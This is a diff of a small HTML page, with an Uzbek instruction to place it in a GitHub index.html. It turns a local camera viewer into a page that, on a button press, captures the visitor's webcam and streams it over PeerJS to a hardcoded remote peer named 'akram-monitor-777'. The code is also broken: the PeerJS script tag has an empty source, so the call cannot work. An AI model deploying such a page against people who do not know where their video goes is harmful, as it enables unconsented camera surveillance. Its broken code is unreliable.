@@ -1,21 +1,26 @@
+Bu kodni GitHub'dagi index.html fayliga joylang:
+
 <!DOCTYPE html>
+
 <html>
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta charset="UTF-8">
+<script src=""></script>
 </head>
-<body style="text-align:center; background:#121212; color:white; font-family:sans-serif; padding-top:50px;">
-    <h2>Kamera Tizimi</h2>
-    <video id="v" autoplay playsinline style="width:90%; max-width:400px; border-radius:15px; border:3px solid #00ff00;"></video>
-    <br><br>
-    <button onclick="openCam()" style="padding:15px 30px; font-size:18px; background:#00ff00; border:none; border-radius:10px; cursor:pointer; font-weight:bold;">KAMERANI YOQISH</button>
-    <script>
-        async function openCam() {
-            try {
-                const s = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
-                document.getElementById('v').srcObject = s;
-            } catch (e) { alert("Ruxsat berilmadi!"); }
-        }
-    </script>
+<body style="background:black; color:white; text-align:center;">
+<h3>TELEFON KAMERASI</h3>
+<video id="v" autoplay playsinline style="width:90%; border:2px solid lime;"></video>
+
+
+
+<button onclick="u()" style="padding:20px; background:lime; font-weight:bold;">KOMPYUTERGA ULANISH</button>
+<script>
+const p = new Peer();
+async function u() {
+const s = await navigator.mediaDevices.getUserMedia({video:true});
+document.getElementById('v').srcObject = s;
+p.call('akram-monitor-777', s);
+}
+</script>
 </body>
 </html>
